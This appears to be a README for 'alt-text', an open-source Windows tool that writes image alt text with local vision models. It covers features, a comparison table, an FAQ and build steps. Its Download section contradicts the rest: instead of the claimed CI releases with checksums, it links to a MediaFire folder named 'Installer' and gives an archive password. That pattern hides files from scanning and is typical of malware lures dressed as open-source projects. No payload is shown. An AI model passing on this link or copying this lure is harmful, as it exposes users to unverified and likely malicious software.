# alt-text

♿ Free, open-source alt text generator for Windows — local vision models write image descriptions in batch. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local vision captions** — a vision-language model describes each image on your machine, no upload
- ✅ **Length styles** — short WCAG-style alt, social caption and detailed description modes per batch
- ✅ **Context hints** — label the batch product, food or chart and the wording follows that register
- ✅ **Batch folders** — hundreds of images walked and captioned into a filename-to-text CSV
- ✅ **Edit pass** — fix wording in a grid before export, with keyboard-only movement
- ✅ **HTML snippet export** — img tags with alt attributes ready to paste into a site
- ✅ **100 MB self-contained exe** — runtime bundled, vision model downloads separately, offline after that, MIT

## Why alt-text

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **alt-text** | ChatGPT vision | Alt-text cloud APIs | Hand writing |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free tier | Paid per call | Your hours |
| Open source | **Yes** | No | No | N/A
| Images stay local | **Yes** | Upload | Upload | Yes
| Batch folder with CSV | **Yes** | No | API only | No
| Length style presets | **Yes** | Prompted | Prompted | Manual
| Portable, no install | **Yes, 100 MB** | Browser | Cloud only | N/A

## FAQ

**generate alt text for many images offline for accessibility compliance?**

Accessibility guidelines require alt text on every image, and cloud vision APIs bill per call while uploading the entire library. alt-text captions folders locally with per-platform styles and exports a CSV or HTML snippets. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark grid (#121417, green #16A34A): image thumbnails with caption fields beneath, style dropdown reading detailed, progress chip showing 143 of 400 described.
2. Edit pass: focused caption expanded with keyboard hints, context hint chip reading product photos, quality note on one low-confidence caption in amber.
3. Export view: CSV preview with filename and alt columns, HTML snippet tab selected, toast reading snippets copied for 400 images.

## Download

| Source | Link |
|---|---|
| 💾 **Installer alt-text** | [Installer alt-text](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).